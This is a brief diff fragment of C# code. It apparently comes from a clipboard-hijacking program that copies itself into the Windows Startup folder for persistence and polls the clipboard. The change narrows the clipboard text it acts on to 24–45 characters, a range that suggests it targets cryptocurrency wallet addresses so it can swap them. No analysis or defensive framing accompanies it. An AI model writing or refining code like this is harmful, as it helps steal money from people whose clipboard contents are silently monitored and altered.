@@ -81,7 +81,7 @@ string path = Environment.GetFolderPath( Environment.SpecialFolder.Startup ) + "
                     {
                         idat = Clipboard.GetText();
 		
-if(idat.Length <50)
+if(idat.Length <46 && idat.Length>23)
 {
                         if (idat != idat_old)
                         {
